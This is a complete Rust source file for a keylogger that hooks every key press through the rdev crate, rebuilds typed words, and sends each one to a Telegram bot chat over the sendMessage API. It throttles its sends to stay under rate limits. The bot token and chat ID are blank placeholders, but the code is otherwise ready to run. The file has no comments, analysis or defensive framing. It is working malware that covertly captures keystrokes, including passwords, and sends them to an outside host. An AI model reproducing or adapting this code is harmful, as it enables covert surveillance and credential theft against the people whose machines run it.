use std::sync::mpsc::{self, Sender};
use std::thread;
use std::time::{Duration, Instant};
use rdev::{listen, Event, EventType, Key};
use reqwest::blocking::Client;

const BOT_TOKEN: &str = "";
const CHAT_ID: &str = "";

fn main() {
    let (tx, rx) = mpsc::channel::<&'static str>();
    let client = Client::new();
    thread::spawn(move || {
        let mut count = 0;
        let mut window_start = Instant::now();
        let mut buffer = String::new();
        while let Ok(key) = rx.recv() {
            match key {
                " " | "{return}" => {
                    buffer.push_str(key);
                    let now = Instant::now();
                    if now.duration_since(window_start) >= Duration::from_secs(1) {
                        window_start = now;
                        count = 0;
                    }
                    if count < 30 {
                        send_key(&client, &buffer);
                        count += 1;
                    } else {
                        thread::sleep(Duration::from_millis(50));
                        window_start = Instant::now();
                        count = 0;
                        send_key(&client, &buffer);
                        count += 1;
                    }
                    buffer.clear();
                }
                "{backspace}" => {
                    buffer.pop();
                }
                _ => {
                    buffer.push_str(key);
                }
            }
        }
    });

    listen(move |event: Event| {
        if let EventType::KeyPress(key) = event.event_type {
            if let Some(key_str) = key_to_str(key) {
                let _ = tx.send(key_str);
            }
        }
    }).unwrap();
}

fn send_key(client: &Client, key: &str) {
    let url = format!("https://api.telegram.org/bot{}/sendMessage", BOT_TOKEN);
    let params = [("chat_id", CHAT_ID), ("text", key)];
    let _ = client.post(&url).form(&params).send();
}

fn key_to_str(key: Key) -> Option<&'static str> {
    match key {
        Key::ShiftLeft | Key::ShiftRight => None,
        Key::CapsLock => Some("{caps_lock}"),
        Key::Return => Some("{return}"),
        Key::Backspace => Some("{backspace}"),
        Key::Tab => Some("{tab}"),
        Key::Space => Some(" "),
        Key::Escape => Some("{escape}"),
        Key::KeyA => Some("a"),
        Key::KeyB => Some("b"),
        Key::KeyC => Some("c"),
        Key::KeyD => Some("d"),
        Key::KeyE => Some("e"),
        Key::KeyF => Some("f"),
        Key::KeyG => Some("g"),
        Key::KeyH => Some("h"),
        Key::KeyI => Some("i"),
        Key::KeyJ => Some("j"),
        Key::KeyK => Some("k"),
        Key::KeyL => Some("l"),
        Key::KeyM => Some("m"),
        Key::KeyN => Some("n"),
        Key::KeyO => Some("o"),
        Key::KeyP => Some("p"),
        Key::KeyQ => Some("q"),
        Key::KeyR => Some("r"),
        Key::KeyS => Some("s"),
        Key::KeyT => Some("t"),
        Key::KeyU => Some("u"),
        Key::KeyV => Some("v"),
        Key::KeyW => Some("w"),
        Key::KeyX => Some("x"),
        Key::KeyY => Some("y"),
        Key::KeyZ => Some("z"),
        Key::Num0 => Some("0"),
        Key::Num1 => Some("1"),
        Key::Num2 => Some("2"),
        Key::Num3 => Some("3"),
        Key::Num4 => Some("4"),
        Key::Num5 => Some("5"),
        Key::Num6 => Some("6"),
        Key::Num7 => Some("7"),
        Key::Num8 => Some("8"),
        Key::Num9 => Some("9"),
        Key::SemiColon => Some(";"),
        Key::Quote => Some("'"),
        Key::LeftBracket => Some("["),
        Key::RightBracket => Some("]"),
        Key::BackSlash => Some("\\"),
        Key::Minus => Some("-"),
        Key::Equal => Some("="),
        Key::Comma => Some(","),
        Key::Dot => Some("."),
        Key::Slash => Some("/"),
        _ => None,
    }
}
